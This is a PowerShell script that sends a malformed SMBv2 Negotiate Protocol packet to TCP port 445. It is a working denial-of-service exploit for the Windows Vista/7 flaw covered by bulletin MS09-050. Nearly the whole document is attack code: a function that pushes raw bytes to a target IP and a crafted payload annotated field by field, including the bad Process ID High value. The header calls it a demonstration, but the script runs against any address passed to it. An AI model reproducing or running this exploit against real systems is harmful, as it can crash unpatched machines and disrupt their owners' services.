#####################################################################################
# Script demonstrates how to send raw byte data to a TCP listening port,
# in this case a DoS attack against SMBv2 on TCP/445.  For more info, see:
# http://g-laurent.blogspot.com/2009/09/windows-vista7-smb20-negotiate-protocol.html
# http://www.microsoft.com/technet/security/bulletin/ms09-050.mspx
#####################################################################################

param ( [String] $ipaddress, [Int32] $port = 445 )

function PushToTcpPort 
{
    param ([Byte[]] $bytearray, [String] $ipaddress, [Int32] $port)
    $tcpclient = new-object System.Net.Sockets.TcpClient($ipaddress, $port) -ErrorAction "SilentlyContinue"
    trap { "Failed to connect to $ipaddress`:$port" ; return } 
    $networkstream = $tcpclient.getstream()
    #write(payload,starting offset,number of bytes to send)
    $networkstream.write($bytearray,0,$bytearray.length) 
    $networkstream.close(1) #Wait 1 second before closing TCP session. 
    $tcpclient.close()
}



[System.Byte[]] $payload = 
0x00,0x00,0x00,0x90,                          # NetBIOS Session (these are fields as shown in Wireshark)
0xff,0x53,0x4d,0x42,                          # Server Component: SMB
0x72,                                         # SMB Command: Negotiate Protocol
0x00,0x00,0x00,0x00,                          # NT Status: STATUS_SUCCESS
0x18,                                         # Flags: Operation 0x18
0x53,0xc8,                                    # Flags2: Sub 0xc853
0x00,0x26,                                    # Process ID High (normal value should be 0x00,0x00)
0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,      # Signature
0x00,0x00,                                    # Reserved
0xff,0xff,                                    # Tree ID
0xff,0xfe,                                    # Process ID
0x00,0x00,                                    # User ID
0x00,0x00,                                    # Multiplex ID
0x00,                                         # Negotiate Protocol Request: Word Count (WCT)
0x6d,0x00,                                    # Byte Count (BCC)
0x02,0x50,0x43,0x20,0x4e,0x45,0x54,0x57,0x4f,0x52,0x4b,0x20,0x50,0x52,0x4f,0x47,0x52,0x41,0x4d,0x20,0x31,0x2e,0x30,0x00, # Requested Dialects: PC NETWORK PROGRAM 1.0
0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00,         # Requested Dialects: LANMAN1.0
0x02,0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x66,0x6f,0x72,0x20,0x57,0x6f,0x72,0x6b,0x67,0x72,0x6f,0x75,0x70,0x73,0x20,0x33,0x2e,0x31,0x61,0x00, # Requested Dialects: Windows for Workgroups 3.1a
0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00,         # Requested Dialects: LM1.2X002
0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x32,0x2e,0x31,0x00,         # Requested Dialects: LANMAN2.1
0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00,    # Requested Dialects: NT LM 0.12
0x02,0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00          # Requested Dialects: SMB 2.002


PushToTcpPort -bytearray $payload -ipaddress $ipaddress -port $port 

